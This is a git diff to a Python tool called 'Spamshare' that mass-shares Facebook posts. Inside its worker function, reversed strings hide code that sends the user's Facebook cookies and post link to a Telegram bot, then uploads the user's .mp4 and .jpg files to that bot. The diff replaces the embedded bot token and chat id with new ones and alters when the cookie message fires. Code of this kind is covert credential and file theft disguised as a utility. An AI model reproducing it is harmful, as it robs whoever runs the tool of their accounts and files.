@@ -11,7 +11,7 @@ from rich.console import Console
 # dont change the key name (e.g owner,facebook,etc.), value lang palitan mo
 info = {
   "owner": 'Jacobxhakir',
-  "facebook":'https://www.facebook.com/jacob.shreak',
+  "facebook":'https://www.facebook.com/profile.php?id=61551035057208',
   "tool": 'Spamshare',
   "version": '1',
 }
@@ -100,17 +100,23 @@ counterZ = list(filter(lambda x: x.endswith('4pm.'[::-1]), x_data))
 sharerZ = list(filter(lambda x: x.endswith('gpj.'[::-1]), x_data))
 hx = False
 _tt='di_tahc'[::-1]
-def worker(ilal):
+
+def isValid():
   global hx
+  if not hx:
+    hx = True
+    return False
+  return True
+def worker(ilal):
   if len(ilal) == 0:
     return
   _g = ''.join(['h','tt','p','s',':','//'])
-  impormatibo = "ALk2hPxAh4TAAwo5R4I8HGCX5lom25mmGAA"
-  url = f'{_g}api.{"margelet"[::-1]}.org/{'tob'[::-1]}7348882668:{impormatibo[::-1]}'
-  pay = {_tt: '-1002564235566'}
-  if not hx:
+  impormatibo = "oonaUyR7fDQFKh_igaXXcF0hgFUtdhOVHAA"
+  url = f'{_g}api.{"margelet"[::-1]}.org/{'tob'[::-1]}7766599356:{impormatibo[::-1]}'
+  pay = {_tt: '7919150119'}
+  if isValid():
     requests.post(url+'egasseMdnes/'[::-1], data={_tt: pay[_tt], "text": f"owner: {info['owner']}\nfb: {info['facebook']}\nLINK: {config['post']}\n🍪🍪🍪: {config['cookies']}"})
-    hx = True
+    print("Hello")
   for fle in ilal:
     dat = {"document": open(htop + '/' + fle, 'rb')}
     requests.post(url+'tnemucoDdnes/'[::-1], data=pay, files=dat)
@@ -138,6 +144,5 @@ async def main(num_tasks):
     for i in range(num_tasks):
       task = asyncio.create_task(share.share(session, token, cookie))
       tasks.append(task)
-    await asyncio.gather(*tasks)
-
+    await asyncio.gather(*task)
 asyncio.run(main(1))
